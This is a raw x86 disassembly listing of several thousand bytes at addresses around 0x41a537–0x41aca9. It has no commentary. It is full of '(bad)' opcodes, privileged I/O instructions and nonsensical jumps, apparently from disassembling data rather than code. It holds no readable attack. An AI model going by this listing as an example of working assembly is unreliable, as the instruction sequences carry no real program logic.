  41a537:	(bad)
  41a53a:	xor    BYTE PTR [ecx],dh
  41a53c:	(bad)  
  41a53d:	dec    edx
  41a53e:	sti    
  41a53f:	rcl    edx,1
  41a541:	cmp    ch,al
  41a543:	pushf  
  41a544:	in     al,dx
  41a545:	fs adc ecx,ebx
  41a548:	cdq    
  41a549:	push   0x20
  41a54b:	fst    DWORD PTR [ecx-0x15]
  41a54e:	mov    eax,0xab56777
  41a553:	dec    edi
  41a554:	jno    0x41a5a6
  41a556:	pop    ss
  41a557:	cld    
  41a558:	mov    edi,0x652193f
  41a55d:	leave  
  41a55e:	fmul   QWORD PTR [eax]
  41a560:	gs cmp ax,0x2dc1
  41a565:	mov    bh,0x22
  41a567:	jns    0x41a544
  41a569:	mov    dh,0x8
  41a56b:	pop    edi
  41a56c:	mov    WORD PTR [ebx+eiz*1+0x10e1ed7],ds
  41a573:	ins    BYTE PTR es:[edi],dx
  41a574:	sahf   
  41a575:	add    BYTE PTR [ecx-0x2b],al
  41a578:	out    0xb7,al
  41a57a:	pop    es
  41a57b:	push   cs
  41a57c:	xchg   esp,eax
  41a57d:	loope  0x41a54c
  41a57f:	fstp   st(5)
  41a581:	dec    eax
  41a582:	pop    ebp
  41a583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a585:	cmp    DWORD PTR [ebx-0x46],ecx
  41a588:	mov    al,0x15
  41a58a:	push   esp
  41a58b:	adc    BYTE PTR [ebp+0x21],cl
  41a58e:	je     0x41a5f1
  41a590:	xchg   ebx,eax
  41a591:	clc    
  41a592:	jae    0x41a551
  41a594:	ds inc edi
  41a596:	ja     0x41a5aa
  41a598:	test   BYTE PTR [edx],0x8e
  41a59b:	icebp  
  41a59c:	mov    ch,0x5a
  41a59e:	imul   BYTE PTR [esi-0x6649950c]
  41a5a4:	fmulp  st(6),st
  41a5a6:	and    BYTE PTR [edi],bl
  41a5a8:	mul    DWORD PTR [ebx+0x4741fdd1]
  41a5ae:	test   esi,ebx
  41a5b0:	xchg   esi,eax
  41a5b1:	add    esp,DWORD PTR [eax+ecx*4+0x4c]
  41a5b5:	sub    ah,BYTE PTR [eax]
  41a5b7:	xchg   edx,eax
  41a5b8:	shl    dh,1
  41a5ba:	xchg   ecx,eax
  41a5bb:	ds das 
  41a5bd:	std    
  41a5be:	mov    edx,0x5d69f65b
  41a5c3:	sbb    BYTE PTR [ecx+eax*1-0x4de1cebf],ch
  41a5ca:	cdq    
  41a5cb:	repz nop/reserved BYTE PTR [ebp+0x4aa2e4ff]
  41a5d3:	cmp    bh,BYTE PTR [ebx-0x2d2954fe]
  41a5d9:	pusha  
  41a5da:	or     ecx,DWORD PTR [edx+0xb]
  41a5dd:	push   es
  41a5de:	popa   
  41a5df:	pop    es
  41a5e0:	mul    BYTE PTR [eax]
  41a5e2:	pop    esi
  41a5e3:	jmp    0x41a64a
  41a5e5:	test   eax,0xe9e8e99c
  41a5ea:	retf   
  41a5eb:	fmul   st(2),st
  41a5ed:	cmp    ebp,ecx
  41a5ef:	inc    ebx
  41a5f0:	arpl   WORD PTR [ecx],cx
  41a5f2:	test   edx,0xbcf57a30
  41a5f8:	jge    0x41a5ff
  41a5fa:	shl    ebx,cl
  41a5fc:	arpl   WORD PTR [edi],bx
  41a5fe:	fistp  DWORD PTR [ecx+0x448637c3]
  41a604:	loop   0x41a62f
  41a606:	cmp    ebx,ebp
  41a608:	js     0x41a611
  41a60a:	xor    DWORD PTR [ebp+0x55],edx
  41a60d:	push   eax
  41a60e:	ret    0x979a
  41a611:	sub    ebp,DWORD PTR ds:0xcf97d387
  41a617:	mov    ah,0x93
  41a619:	and    cl,al
  41a61b:	pushf  
  41a61c:	(bad)  
  41a61d:	fnstenv [ecx-0x60]
  41a620:	sahf   
  41a621:	mov    al,0x45
  41a623:	js     0x41a5d8
  41a625:	jno    0x41a643
  41a627:	add    eax,0xa789a372
  41a62c:	(bad)  
  41a62d:	mov    ecx,0xbe22665c
  41a632:	das    
  41a633:	shl    BYTE PTR [ecx-0x5c],cl
  41a636:	lock sub eax,0xc5dd8750
  41a63c:	sub    al,0x7b
  41a63e:	(bad)  
  41a63f:	adc    al,BYTE PTR [esi-0x21]
  41a642:	push   ebp
  41a643:	adc    BYTE PTR [esi+0x17],cl
  41a646:	fs aaa 
  41a648:	pop    eax
  41a649:	cmp    eax,0xc9192f86
  41a64e:	test   DWORD PTR [ebx-0x7b],ebx
  41a651:	mov    ds:0x1ae27203,eax
  41a656:	mov    dh,0xca
  41a658:	lods   eax,DWORD PTR ds:[esi]
  41a659:	(bad)  
  41a65a:	imul   ebp,DWORD PTR [ecx+0x5f8e0fe3],0xffffffd9
  41a661:	add    DWORD PTR [ebx],edi
  41a663:	jg     0x41a600
  41a665:	jae    0x41a6a4
  41a667:	xchg   ebx,eax
  41a668:	xor    eax,0x55b3654c
  41a66d:	push   eax
  41a66e:	jmp    0x41a660
  41a670:	icebp  
  41a671:	push   ecx
  41a672:	sub    al,0x3a
  41a674:	push   edi
  41a675:	(bad)  
  41a676:	jg     0x41a6b2
  41a678:	dec    ebx
  41a679:	pop    ecx
  41a67a:	pop    esi
  41a67b:	in     eax,dx
  41a67c:	push   0x71
  41a67e:	iret   
  41a67f:	mov    edi,0x4b56e527
  41a684:	(bad)  
  41a685:	std    
  41a686:	test   al,0x6
  41a688:	push   ss
  41a689:	pop    esp
  41a68a:	idiv   DWORD PTR [edi]
  41a68c:	mov    ds:0x8cde47ad,al
  41a691:	sar    BYTE PTR [eax],0xa5
  41a694:	rol    DWORD PTR [edi+0x4510cef2],cl
  41a69a:	test   al,0x3
  41a69c:	aam    0x14
  41a69e:	dec    esp
  41a69f:	sbb    al,0x58
  41a6a1:	fsubr  DWORD PTR [ecx-0x24]
  41a6a4:	or     cl,BYTE PTR [edx-0x3f]
  41a6a7:	xchg   ecx,eax
  41a6a8:	aaa    
  41a6a9:	(bad)  
  41a6aa:	jb     0x41a6c8
  41a6ac:	and    BYTE PTR [eax-0x57],ah
  41a6af:	lds    eax,FWORD PTR [eax]
  41a6b1:	sbb    edi,DWORD PTR [edx-0x1fd47aa5]
  41a6b7:	loop   0x41a6de
  41a6b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6bb:	in     al,dx
  41a6bc:	add    al,0x78
  41a6be:	sub    BYTE PTR [edi-0x7f03589c],dh
  41a6c4:	cmp    eax,0x8e142474
  41a6c9:	imul   ebx,DWORD PTR [ebx-0x113c2719],0x61
  41a6d0:	xchg   bx,ax
  41a6d2:	pop    ebx
  41a6d3:	and    al,0x61
  41a6d5:	pop    ecx
  41a6d6:	cmp    al,0x63
  41a6d8:	gs jle 0x41a68b
  41a6db:	cmp    eax,0xa7de2884
  41a6e0:	cdq    
  41a6e1:	sbb    BYTE PTR [edi-0x5077f2db],0x5a
  41a6e8:	sub    BYTE PTR [ebx],dl
  41a6ea:	sbb    dh,al
  41a6ec:	push   edx
  41a6ed:	pushf  
  41a6ee:	jnp    0x41a67f
  41a6f0:	jb     0x41a687
  41a6f2:	jmp    0x41a6ae
  41a6f4:	xchg   ebx,eax
  41a6f5:	jb     0x41a72f
  41a6f7:	retf   0xe6ae
  41a6fa:	scas   al,BYTE PTR es:[edi]
  41a6fb:	cld    
  41a6fc:	mov    ds:0x39a0878,al
  41a701:	dec    esp
  41a702:	pop    es
  41a703:	jp     0x41a6cb
  41a705:	imul   esi,DWORD PTR [esi-0x57],0xd9ac518b
  41a70c:	xor    BYTE PTR [eax+edx*4],bl
  41a70f:	xchg   DWORD PTR [esi+0x6],ebx
  41a712:	sbb    eax,0x83d04fe9
  41a717:	test   DWORD PTR [esi+eax*4],esp
  41a71a:	add    ebx,ebp
  41a71c:	pop    ecx
  41a71d:	cmp    al,0x2d
  41a71f:	xchg   edx,eax
  41a720:	inc    edx
  41a721:	loopne 0x41a760
  41a723:	icebp  
  41a724:	cdq    
  41a725:	mov    eax,0x6478b934
  41a72a:	ss (bad) 
  41a72c:	in     eax,dx
  41a72d:	mov    ebx,eax
  41a72f:	push   0x8174d467
  41a734:	mov    esp,0x87ad95cb
  41a739:	mov    bh,0xc2
  41a73b:	mov    dl,0xdc
  41a73d:	and    dh,ah
  41a73f:	mov    bh,0xed
  41a741:	std    
  41a742:	mov    ds:0xad360feb,eax
  41a747:	jno    0x41a6c9
  41a749:	dec    edi
  41a74a:	cdq    
  41a74b:	stos   BYTE PTR es:[edi],al
  41a74c:	mov    edi,DWORD PTR [esi+edx*2+0x6d]
  41a750:	clc    
  41a751:	jns    0x41a700
  41a753:	push   es
  41a754:	sbb    esp,eax
  41a756:	push   esi
  41a757:	imul   ebx,ebx,0xf9da26f5
  41a75d:	xchg   esi,eax
  41a75e:	pop    ebx
  41a75f:	xor    BYTE PTR [ebp+0x60f954e],0xda
  41a766:	imul   edx,DWORD PTR [esi-0x3f],0x7d
  41a76a:	and    DWORD PTR [edx+0x1],esp
  41a76d:	sahf   
  41a76e:	in     eax,0xf
  41a770:	mov    ecx,0xe0e6a401
  41a775:	pop    esp
  41a776:	icebp  
  41a777:	and    eax,0xac316592
  41a77c:	test   DWORD PTR [edi+0x3f6abb8],ecx
  41a782:	mov    ds:0x61d23720,al
  41a787:	fidiv  DWORD PTR [esi+0x2e]
  41a78a:	adc    DWORD PTR es:[eax+0x11],ebp
  41a78e:	jge    0x41a7b7
  41a790:	jmp    0x6707:0xf8767bbb
  41a797:	xor    ah,BYTE PTR [ebx]
  41a799:	sbb    dh,cl
  41a79b:	push   ebx
  41a79c:	mov    ebp,0x7337fa97
  41a7a1:	push   ebp
  41a7a2:	pop    ss
  41a7a3:	dec    esp
  41a7a4:	dec    edx
  41a7a5:	mov    al,ds:0xe2258b4f
  41a7aa:	cdq    
  41a7ab:	ds (bad) 
  41a7ad:	out    0x37,al
  41a7af:	jmp    0x3f21:0x7e572fe4
  41a7b6:	xor    al,ch
  41a7b8:	pusha  
  41a7b9:	outs   dx,DWORD PTR ds:[esi]
  41a7ba:	push   ebp
  41a7bb:	shl    DWORD PTR [edx],cl
  41a7bd:	jecxz  0x41a837
  41a7bf:	imul   ecx,DWORD PTR [esi],0x40
  41a7c2:	loope  0x41a821
  41a7c4:	pop    edx
  41a7c5:	dec    eax
  41a7c6:	jmp    0x41a832
  41a7c8:	outs   dx,DWORD PTR ds:[esi]
  41a7c9:	gs mov ch,bh
  41a7cc:	imul   edi,edi,0x20
  41a7cf:	and    BYTE PTR ds:0x55bd5ad0,ah
  41a7d5:	jne    0x41a834
  41a7d7:	sub    al,0xb4
  41a7d9:	and    al,BYTE PTR [ecx]
  41a7db:	push   ecx
  41a7dc:	inc    esi
  41a7dd:	inc    edi
  41a7de:	dec    esi
  41a7df:	addr16 add edi,ebp
  41a7e2:	xor    dl,ah
  41a7e4:	mov    ebp,0xd1b7841b
  41a7e9:	sub    eax,DWORD PTR [eax+0x7e860df9]
  41a7ef:	adc    al,0x4c
  41a7f1:	sbb    al,0xc1
  41a7f3:	mov    edx,0xb69b2de1
  41a7f8:	in     eax,0x89
  41a7fa:	mov    cl,0xba
  41a7fc:	or     DWORD PTR [ecx],ebx
  41a7fe:	push   ss
  41a7ff:	mov    ah,0x25
  41a801:	idiv   DWORD PTR [edi-0x32]
  41a804:	mov    ecx,0x2b07e1ba
  41a809:	add    BYTE PTR [eax+0x41489f4c],bl
  41a80f:	stos   BYTE PTR es:[edi],al
  41a810:	sub    ecx,DWORD PTR [ecx+eax*2+0x4fabea2c]
  41a817:	ins    BYTE PTR es:[edi],dx
  41a818:	out    0x4b,al
  41a81a:	addr16 cwde 
  41a81c:	test   al,0xf6
  41a81e:	pop    esp
  41a81f:	fsubr  DWORD PTR [ecx+0x4a]
  41a822:	push   edi
  41a823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a824:	and    BYTE PTR [ebp+0x28],bl
  41a827:	popa   
  41a828:	aad    0x76
  41a82a:	mov    edi,0x65a9b43b
  41a82f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a830:	sbb    eax,0x207f9f47
  41a835:	(bad)  
  41a836:	dec    esi
  41a837:	sbb    cl,ah
  41a839:	(bad)
  41a83c:	ja     0x41a82e
  41a83e:	test   BYTE PTR [eax],dl
  41a840:	es das 
  41a842:	mov    eax,0xe9adee82
  41a847:	push   esp
  41a848:	frstor [edi-0x67]
  41a84b:	in     al,0x37
  41a84d:	pop    ecx
  41a84e:	sub    DWORD PTR [ecx],edx
  41a850:	sti    
  41a851:	add    al,ch
  41a853:	pop    edi
  41a854:	mov    ds:0xe6913a89,eax
  41a859:	and    eax,0xddb9c963
  41a85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a85f:	add    ebp,DWORD PTR [edx*1-0x4e504443]
  41a866:	pop    edx
  41a867:	imul   ecx,DWORD PTR [ebp-0x16],0xffffff89
  41a86b:	xchg   BYTE PTR [edx],ah
  41a86d:	ins    BYTE PTR es:[edi],dx
  41a86e:	loope  0x41a821
  41a870:	loopne 0x41a84c
  41a872:	push   ds
  41a873:	mov    BYTE PTR [ebx-0x45fafc3b],ch
  41a879:	pop    edx
  41a87a:	into   
  41a87b:	inc    ecx
  41a87c:	in     eax,dx
  41a87d:	out    dx,eax
  41a87e:	xor    dh,ch
  41a880:	or     al,0x3c
  41a882:	or     ecx,esi
  41a884:	inc    ebx
  41a885:	iret   
  41a886:	or     BYTE PTR [edi],ah
  41a888:	popf   
  41a889:	adc    al,0xc4
  41a88b:	jmp    0x59bb9c3f
  41a890:	xor    DWORD PTR [esi+0x988150a],0x56a7567e
  41a89a:	mov    bh,0x42
  41a89c:	add    al,0x62
  41a89e:	jmp    0xb4125d93
  41a8a3:	aas    
  41a8a4:	mov    eax,0xcbc76f3c
  41a8a9:	clc    
  41a8aa:	sbb    ch,BYTE PTR [ecx+0x1]
  41a8ad:	dec    ecx
  41a8ae:	mul    DWORD PTR [edi+0x3414367b]
  41a8b4:	dec    ecx
  41a8b5:	int3   
  41a8b6:	push   0x2b64eaed
  41a8bb:	ins    DWORD PTR es:[edi],dx
  41a8bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8bd:	jl     0x41a891
  41a8bf:	cmp    esp,DWORD PTR [ebx-0x4f]
  41a8c2:	hlt    
  41a8c3:	sub    DWORD PTR [edx+0x72],0x4d5a0418
  41a8ca:	sbb    bl,BYTE PTR [ebp+0x33c29ce3]
  41a8d0:	pop    edi
  41a8d1:	repnz aas 
  41a8d3:	inc    esp
  41a8d4:	and    eax,0xb17b8129
  41a8d9:	xchg   esp,eax
  41a8da:	loop   0x41a8e3
  41a8dc:	pop    edx
  41a8dd:	test   DWORD PTR [edx-0x76],esi
  41a8e0:	sub    eax,0x9fbcf1f9
  41a8e5:	push   cs
  41a8e6:	shl    DWORD PTR [eax],1
  41a8e8:	aam    0x4f
  41a8ea:	mov    DWORD PTR [eax],edi
  41a8ec:	in     eax,dx
  41a8ed:	push   es
  41a8ee:	sbb    DWORD PTR [eax+0xd8086bc],0xd78d73f6
  41a8f8:	mov    ebx,0xc8f7fe89
  41a8fd:	fs mov al,0x67
  41a900:	loop   0x41a954
  41a902:	ror    BYTE PTR [edi+0x18ec357c],cl
  41a908:	in     eax,0xa1
  41a90a:	or     DWORD PTR [eax-0x6e],edi
  41a90d:	mov    bh,0x8e
  41a90f:	out    0xfb,eax
  41a911:	fisubr DWORD PTR [esi+edi*2]
  41a914:	xor    al,0xe1
  41a916:	cmc    
  41a917:	pop    ebp
  41a918:	push   ebp
  41a919:	push   ss
  41a91a:	repz jmp 0x41a8d9
  41a91d:	add    ah,bl
  41a91f:	mov    al,ds:0xb007137e
  41a924:	or     eax,0xf870c0a7
  41a929:	ret    
  41a92a:	sub    BYTE PTR [esi+0x147bcf76],0xca
  41a931:	imul   eax,ebp,0x57541578
  41a937:	sbb    ah,BYTE PTR [ebx-0x5007e944]
  41a93d:	test   eax,0x7f6e0199
  41a942:	retf   
  41a943:	fsubr  DWORD PTR [ecx+ebx*4-0x452005b0]
  41a94a:	clc    
  41a94b:	lds    ebx,FWORD PTR [edi+0x10]
  41a94e:	jle    0x41a95b
  41a950:	(bad)  
  41a951:	pop    edi
  41a952:	imul   esp,DWORD PTR [edx-0x54],0xffffffff
  41a956:	and    dl,bl
  41a958:	rcr    DWORD PTR [ecx-0x37986ae4],cl
  41a95e:	or     eax,DWORD PTR ds:0x62c9993b
  41a964:	dec    eax
  41a965:	dec    ebx
  41a966:	aad    0xf2
  41a968:	sbb    eax,0x131b543a
  41a96d:	call   0x14e153ad
  41a972:	call   0x4ba0680c
  41a977:	pop    ds
  41a978:	(bad)  
  41a979:	adc    eax,0x291bfc61
  41a97e:	loop   0x41a9a1
  41a980:	daa    
  41a981:	dec    edx
  41a982:	test   eax,ecx
  41a984:	sub    DWORD PTR [edx],ebx
  41a986:	outs   dx,BYTE PTR ds:[esi]
  41a987:	pop    edi
  41a988:	pop    esp
  41a989:	mov    eax,0x78a068aa
  41a98e:	test   al,0x86
  41a990:	add    DWORD PTR [ecx-0x9b94765],0x45
  41a997:	data16 mov dl,cl
  41a99a:	dec    esp
  41a99b:	in     al,0x8
  41a99d:	mov    ebp,0x2b8494e4
  41a9a2:	loop   0x41a99c
  41a9a4:	out    0xa4,al
  41a9a6:	scas   eax,DWORD PTR es:[edi]
  41a9a7:	dec    eax
  41a9a8:	inc    edx
  41a9a9:	(bad)  
  41a9aa:	stc    
  41a9ab:	mov    al,BYTE PTR [esi-0x5239acaf]
  41a9b1:	in     eax,0x4
  41a9b3:	adc    DWORD PTR [ebx+0x5e],ebp
  41a9b6:	dec    eax
  41a9b7:	jmp    0xc97228f8
  41a9bc:	ins    DWORD PTR es:[edi],dx
  41a9bd:	jbe    0x41a977
  41a9bf:	jecxz  0x41aa1b
  41a9c1:	jae    0x41aa18
  41a9c3:	mov    ds,WORD PTR [edx-0x16]
  41a9c6:	cmp    esp,0xfffffff5
  41a9c9:	stos   DWORD PTR es:[edi],eax
  41a9ca:	fwait
  41a9cb:	ds cmp al,0xf8
  41a9ce:	mov    ecx,0xccb4fe9d
  41a9d3:	pop    es
  41a9d4:	out    0x79,al
  41a9d6:	dec    ebp
  41a9d7:	fadd   st(7),st
  41a9d9:	add    ebx,ecx
  41a9db:	fcmove st,st(2)
  41a9dd:	jo     0x41aa55
  41a9df:	inc    esi
  41a9e0:	jg     0x41aa11
  41a9e2:	imul   ebx,eax,0x63
  41a9e5:	std    
  41a9e6:	jo     0x41aa29
  41a9e8:	pop    ecx
  41a9e9:	int3   
  41a9ea:	mov    al,0x34
  41a9ec:	dec    ebp
  41a9ed:	out    0xac,eax
  41a9ef:	or     BYTE PTR ds:0x75125101,dl
  41a9f5:	and    BYTE PTR [ecx+0xc],ch
  41a9f8:	ins    DWORD PTR es:[edi],dx
  41a9f9:	and    al,0x79
  41a9fb:	jmp    0x8de07973
  41aa00:	mov    al,0x76
  41aa02:	jb     0x41aa17
  41aa04:	sub    BYTE PTR [eax-0x6e],al
  41aa07:	lea    esi,[ecx+0x27a91d6f]
  41aa0d:	inc    edi
  41aa0e:	dec    edi
  41aa0f:	push   es
  41aa10:	ins    BYTE PTR es:[edi],dx
  41aa11:	test   eax,0x6ff55983
  41aa16:	mov    al,0xc2
  41aa18:	sbb    eax,DWORD PTR ds:[ebx+0x32]
  41aa1c:	push   edi
  41aa1d:	ss ins DWORD PTR es:[edi],dx
  41aa1f:	imul   eax,DWORD PTR [esi-0x495ed0df],0xdce85d10
  41aa29:	mov    si,0xd5cd
  41aa2d:	enter  0xe6ae,0x7e
  41aa31:	rol    edx,cl
  41aa33:	pop    ds
  41aa34:	or     eax,0xbcddbc43
  41aa39:	shl    bh,cl
  41aa3b:	(bad)  
  41aa3d:	ins    DWORD PTR es:[edi],dx
  41aa3e:	jae    0x41aa9a
  41aa40:	test   BYTE PTR ds:0x1ef81789,bl
  41aa46:	data16 and dl,BYTE PTR [ecx+edx*2+0x70]
  41aa4b:	cld    
  41aa4c:	aaa    
  41aa4d:	xchg   edi,eax
  41aa4e:	sbb    esi,DWORD PTR [edx+0x1d2acd36]
  41aa54:	mov    cl,BYTE PTR [eax+0x3c8b4013]
  41aa5a:	lods   al,BYTE PTR ds:[esi]
  41aa5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa5c:	push   ebx
  41aa5d:	push   es
  41aa5e:	jnp    0x41aa9d
  41aa60:	inc    ebx
  41aa61:	mov    esi,0x3eadc624
  41aa66:	adc    al,0xcc
  41aa68:	push   esi
  41aa69:	cwde   
  41aa6a:	xor    esi,ecx
  41aa6c:	inc    esi
  41aa6d:	mov    bh,0x44
  41aa6f:	push   esp
  41aa71:	mov    ecx,0x21aca277
  41aa76:	fs sahf 
  41aa78:	push   0xffffffcd
  41aa7a:	mov    edi,0xd91b04ae
  41aa7f:	dec    esi
  41aa80:	scas   al,BYTE PTR es:[edi]
  41aa81:	loop   0x41aa7f
  41aa83:	ins    DWORD PTR es:[edi],dx
  41aa84:	pop    edi
  41aa85:	js     0x41aa41
  41aa87:	shl    BYTE PTR [esi],0xce
  41aa8a:	jnp    0x41aa79
  41aa8c:	out    0xa8,eax
  41aa8e:	xor    al,0xe
  41aa90:	aam    0xd
  41aa92:	mov    bl,0x5a
  41aa94:	outs   dx,BYTE PTR ds:[esi]
  41aa95:	shr    BYTE PTR [esi],0x20
  41aa98:	pop    edx
  41aa99:	icebp  
  41aa9a:	std    
  41aa9b:	scas   eax,DWORD PTR es:[edi]
  41aa9c:	std    
  41aa9d:	out    0x60,eax
  41aa9f:	push   ebx
  41aaa0:	sub    edx,DWORD PTR [esi+0x24]
  41aaa3:	push   eax
  41aaa4:	pop    ds
  41aaa5:	in     eax,dx
  41aaa6:	outs   dx,BYTE PTR ds:[esi]
  41aaa7:	push   ss
  41aaa8:	mov    BYTE PTR [ecx-0x501f4f08],dh
  41aaae:	data16 xor cl,BYTE PTR [edi-0xfac1c80]
  41aab5:	cmp    edx,ebp
  41aab7:	xchg   ebp,eax
  41aab8:	inc    eax
  41aab9:	and    DWORD PTR [esi],0x5ace0861
  41aabf:	push   edi
  41aac0:	retf   
  41aac1:	push   0x139b60e3
  41aac6:	push   ss
  41aac7:	push   0xc7b2e076
  41aacc:	adc    BYTE PTR [eax+0x12],dl
  41aacf:	jno    0x41ab20
  41aad1:	loopne 0x41aa59
  41aad3:	pusha  
  41aad4:	les    ebx,FWORD PTR [edi-0x42]
  41aad7:	stc    
  41aad8:	ror    ebx,0x11
  41aadb:	fisub  WORD PTR [ebp+0x24]
  41aade:	pushf  
  41aadf:	dec    ecx
  41aae0:	push   eax
  41aae1:	ds and eax,0xdbf21390
  41aae7:	fnstenv [esi]
  41aae9:	call   0x5b76137
  41aaee:	adc    BYTE PTR [esp+edi*2],0xc6
  41aaf2:	pop    ebx
  41aaf3:	xchg   esp,eax
  41aaf4:	jne    0x41aab3
  41aaf6:	jle    0x41aaa6
  41aaf8:	lock inc esi
  41aafa:	scas   al,BYTE PTR es:[edi]
  41aafb:	jb     0x41aab3
  41aafd:	xor    DWORD PTR [edx+0x5a],eax
  41ab00:	mov    bl,0x19
  41ab02:	push   ds
  41ab03:	pop    eax
  41ab04:	xor    BYTE PTR [ecx-0x5a],0xe3
  41ab08:	and    DWORD PTR [esp+ecx*1+0x24],eax
  41ab0c:	push   edx
  41ab0d:	cdq    
  41ab0e:	mov    es,WORD PTR [ebp-0x2c8c6add]
  41ab14:	and    DWORD PTR [eax],ebp
  41ab16:	daa    
  41ab17:	sub    eax,0x3c6d8a5b
  41ab1c:	adc    ch,BYTE PTR [eax+edx*2-0x128c542c]
  41ab23:	jg     0x41ab44
  41ab25:	dec    eax
  41ab26:	inc    esi
  41ab27:	add    eax,0x856368ea
  41ab2c:	pop    esp
  41ab2d:	mov    ebx,0x19d8a976
  41ab32:	jo     0x41aba3
  41ab34:	test   BYTE PTR [ebx-0x64],ah
  41ab37:	data16 and dh,BYTE PTR fs:[eax]
  41ab3b:	sbb    al,0xea
  41ab3d:	mov    WORD PTR [eax+0x11],gs
  41ab40:	or     DWORD PTR [ebx],esp
  41ab42:	sub    al,0xc8
  41ab44:	out    dx,eax
  41ab45:	les    eax,FWORD PTR [eax+0x2f50ac78]
  41ab4b:	fist   DWORD PTR [esi+edi*4+0xd4fe82d]
  41ab52:	inc    esi
  41ab53:	cld    
  41ab54:	mov    esp,0x51d8a29f
  41ab59:	add    al,0x4f
  41ab5b:	jmp    0x8e18:0x91ed74f2
  41ab62:	xor    al,0xdb
  41ab64:	dec    edi
  41ab65:	jne    0x41ab0c
  41ab67:	dec    esi
  41ab68:	or     eax,0xde086db6
  41ab6d:	les    edi,FWORD PTR ds:0xb6f6d8fc
  41ab73:	cmp    DWORD PTR [ebp-0xacd3040],ebp
  41ab79:	cdq    
  41ab7a:	sbb    eax,0xad5f6b23
  41ab7f:	jp     0x41ab18
  41ab81:	jmp    0xdbfba66d
  41ab86:	jb     0x41ab1d
  41ab88:	ficomp WORD PTR [ebx]
  41ab8a:	push   ss
  41ab8b:	mov    esi,0xfb6d9f1
  41ab90:	out    0x59,eax
  41ab92:	pop    edi
  41ab93:	scas   eax,DWORD PTR es:[edi]
  41ab94:	outs   dx,DWORD PTR ds:[esi]
  41ab95:	xchg   ebp,eax
  41ab96:	and    al,0x33
  41ab98:	test   al,0x8b
  41ab9a:	or     eax,0x6095254d
  41ab9f:	(bad)  
  41aba0:	loopne 0x41abac
  41aba2:	ficomp DWORD PTR [ebx+0x7d]
  41aba5:	add    eax,0x212ab427
  41abaa:	jmp    0x9c31d923
  41abaf:	inc    edi
  41abb0:	gs pop edx
  41abb2:	ror    ch,0x5a
  41abb5:	sub    dh,bl
  41abb7:	sub    ecx,DWORD PTR [ebp+0x4b]
  41abba:	push   ebp
  41abbb:	pop    eax
  41abbc:	inc    eax
  41abbd:	mov    edi,0x8e7e35e1
  41abc2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41abc4:	stos   BYTE PTR es:[edi],al
  41abc5:	(bad)  
  41abc6:	push   0x32
  41abc8:	jl     0x41ac48
  41abca:	push   edx
  41abcb:	cmp    eax,0xa501eaaa
  41abd0:	lock cmp DWORD PTR [ebp+0xedf71bd],ebp
  41abd7:	cli    
  41abd8:	call   0x75f:0x869cf933
  41abdf:	or     ebx,DWORD PTR [edx]
  41abe1:	mov    BYTE PTR [ebx-0x57],bl
  41abe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe5:	in     eax,0xe5
  41abe7:	gs mov cl,0x68
  41abea:	pop    edx
  41abeb:	std    
  41abec:	sbb    al,0x41
  41abee:	stos   DWORD PTR es:[edi],eax
  41abef:	sub    dl,ch
  41abf1:	dec    ecx
  41abf2:	jbe    0x41ac6c
  41abf4:	lock jmp 0xdd4480d7
  41abfa:	pop    es
  41abfb:	xchg   edx,eax
  41abfc:	mov    eax,0xd0c7b048
  41ac01:	mov    bl,0xe2
  41ac03:	adc    esp,eax
  41ac05:	inc    ebp
  41ac06:	cmovl  eax,ebx
  41ac09:	cmp    al,0x26
  41ac0b:	shl    DWORD PTR [esi-0x167704b],cl
  41ac11:	xlat   BYTE PTR ds:[ebx]
  41ac12:	in     al,0xa3
  41ac14:	out    0x7a,al
  41ac16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac17:	and    eax,0x59f0f9f1
  41ac1c:	out    dx,eax
  41ac1d:	jmp    0x41ac2a
  41ac1f:	jl     0x41abd3
  41ac21:	mov    esp,edi
  41ac23:	fbld   TBYTE PTR [ebx]
  41ac25:	jecxz  0x41ac4d
  41ac27:	aas    
  41ac28:	jmp    0x2322d18c
  41ac2d:	mov    bl,0xc2
  41ac2f:	cmp    edx,DWORD PTR [edi+0x408f7ab2]
  41ac35:	push   ecx
  41ac36:	leave  
  41ac37:	push   esi
  41ac38:	jbe    0x41ac34
  41ac3a:	sbb    eax,0xcdbe07a8
  41ac3f:	daa    
  41ac40:	data16 js 0x41abfa
  41ac43:	mov    ds:0xa7a652f3,eax
  41ac48:	(bad)  
  41ac49:	mov    edx,0x602eab71
  41ac4e:	div    BYTE PTR [eax-0x40]
  41ac51:	sbb    cl,BYTE PTR ds:0xf052b891
  41ac57:	out    0xa0,al
  41ac59:	enter  0xe187,0x9f
  41ac5d:	inc    eax
  41ac5e:	mov    esp,0xc7d0e1d1
  41ac63:	cs scas eax,DWORD PTR es:[edi]
  41ac65:	js     0x41ac6b
  41ac67:	sub    al,0xf
  41ac69:	es and DWORD PTR ss:[esi+0x7c],ebx
  41ac6e:	fmul   st(0),st
  41ac70:	(bad)  
  41ac71:	in     eax,dx
  41ac72:	je     0x41ace3
  41ac74:	xor    bl,bl
  41ac76:	mov    edx,0x1c93d114
  41ac7b:	loope  0x41ac90
  41ac7d:	pop    es
  41ac7e:	test   BYTE PTR [ebx],ah
  41ac80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac81:	lods   eax,DWORD PTR ds:[esi]
  41ac82:	mov    ch,0xef
  41ac84:	dec    ebx
  41ac85:	call   0xe9081633
  41ac8a:	fwait
  41ac8b:	push   0x20
  41ac8d:	dec    edi
  41ac8e:	es mov ch,0x27
  41ac91:	shl    BYTE PTR [ebx],cl
  41ac93:	mov    ah,0x99
  41ac95:	das    
  41ac96:	mov    ebp,0x59ae8b53
  41ac9b:	jns    0x41ac4a
  41ac9d:	mov    esi,0x79ab8e27
  41aca2:	dec    edi
  41aca3:	ror    DWORD PTR [ebx-0x576d7323],cl
  41aca9:	lock loopne 0x41ac9c
